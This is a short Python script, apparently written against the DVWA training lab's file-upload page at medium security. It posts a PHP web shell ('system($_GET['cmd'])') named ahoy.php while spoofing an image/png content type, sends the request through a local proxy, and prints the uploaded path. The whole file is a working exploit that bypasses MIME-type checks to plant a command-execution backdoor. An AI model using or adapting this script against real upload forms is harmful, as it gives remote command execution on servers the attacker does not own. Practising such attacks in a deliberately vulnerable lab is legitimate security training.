import requests
from bs4 import BeautifulSoup

http_proxy = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

payload = "<?php system($_GET"
payload += "['cmd']); ?>"

files = {
    'MAX_FILE_SIZE': (None, '100000'),
    'uploaded': ('ahoy.php', payload, 'image/png'),
    'Upload': (None, 'Upload')
}

cookie = {"PHPSESSID":"4040a3c26a47dc662c1fd0c765e29f12", "security":"medium"}

url = "http://localhost:4280/vulnerabilities/upload/"

r = requests.post(url, files=files, cookies=cookie, proxies=http_proxy)

soup = BeautifulSoup(r.text, 'html.parser')
pre_tag = soup.find('pre')

if pre_tag:
    path = pre_tag.text.strip()
    print("Uploaded Path:", path.split()[0])
else:
    print("Huh something wrong")